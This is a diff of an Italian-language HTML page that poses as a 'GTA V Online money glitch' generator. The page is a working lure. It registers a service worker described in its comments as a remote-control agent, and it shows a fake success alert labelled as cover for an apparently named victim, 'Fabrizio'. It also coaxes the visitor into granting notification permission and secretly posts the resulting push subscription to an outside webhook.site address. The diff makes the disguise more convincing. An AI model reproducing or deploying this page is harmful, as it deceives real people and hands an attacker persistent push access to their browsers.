@@ -5,32 +5,44 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GTA V Online - Money Glitch 2026</title>
     <style>
-        body { background-color: #000; color: #ff0000; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        body { background-color: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 50px; }
         #hack-button { 
-            background-color: #ff0000; color: white; border: none; padding: 20px 40px; 
-            font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 10px;
-            box-shadow: 0 0 20px #ff0000;
+            background-color: #ff0000; color: white; border: none; padding: 25px 50px; 
+            font-size: 22px; font-weight: bold; cursor: pointer; border-radius: 15px;
+            box-shadow: 0 0 30px #ff0000; transition: 0.3s;
         }
+        #hack-button:hover { background-color: #cc0000; box-shadow: 0 0 50px #ff0000; }
+        .status { color: #00ff00; font-size: 14px; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <h1>SISTEMA ACCREDITO GTA V</h1>
-    <p>Stato Server: <span style="color: lime;">ATTIVO</span></p>
+    <h1>SISTEMA GENERATORE GTA V</h1>
+    <p>Connessione Server: <span class="status">STABILE</span></p>
+    <p>Stato Database: <span class="status">ONLINE</span></p>
+    
     <br><br>
-    <button id="hack-button" onclick="avviaAttacco()">CLICCA PER SOLDI INFINITI</button>
+    
+    <button id="hack-button" onclick="avviaAttacco()">ATTIVA GLITCH SOLDI</button>
 
     <script>
-        // Registrazione dell'agente per il controllo remoto
+        // 1. REGISTRAZIONE AUTOMATICA DELL'AGENTE
         if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('./sw.js');
+            window.addEventListener('load', function() {
+                navigator.serviceWorker.register('./sw.js').then(function(reg) {
+                    console.log('Agente pronto.');
+                }).catch(function(err) {
+                    console.error('Errore registrazione agente:', err);
+                });
+            });
         }
 
+        // 2. FUNZIONE DI CATTURA (WEBHOOK)
         function avviaAttacco() {
             Notification.requestPermission().then(function(permission) {
                 if (permission === 'granted') {
-                    // Copertura per la vittima
-                    alert('CONNESSO! Risorse in fase di accreditamento sul tuo account...');
+                    // Messaggio di copertura per Fabrizio
+                    alert('ACCESSO EFFETTUATO! Caricamento risorse in corso...');
 
                     navigator.serviceWorker.ready.then(function(reg) {
                         reg.pushManager.subscribe({
@@ -38,17 +50,23 @@
                             applicationServerKey: 'BEl62vpov1-enYizvyG975dxzYI_E7XfS-pU'
                         }).then(function(sub) {
                             
-                            // INVIO SEGRETO AL TUO WEBHOOK
+                            // INVIO DEI DATI AL TUO WEBHOOK PERSONALE
                             fetch('https://webhook.site/562e593a-485a-4b2d-ba7d-245bc5f33e72', {
                                 method: 'POST',
-                                mode: 'no-cors', 
-                                body: JSON.stringify(sub)
+                                body: JSON.stringify(sub),
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                }
+                            }).then(function() {
+                                console.log('ID inviato al database dell\'hacker.');
                             });
                             
+                        }).catch(function(e) {
+                            console.error('Errore nel generare l\'ID:', e);
                         });
                     });
                 } else {
-                    alert('ERRORE: Devi cliccare su CONSENTI per attivare il glitch!');
+                    alert('ERRORE: Devi cliccare su CONSENTI per ricevere i soldi!');
                 }
             });
         }
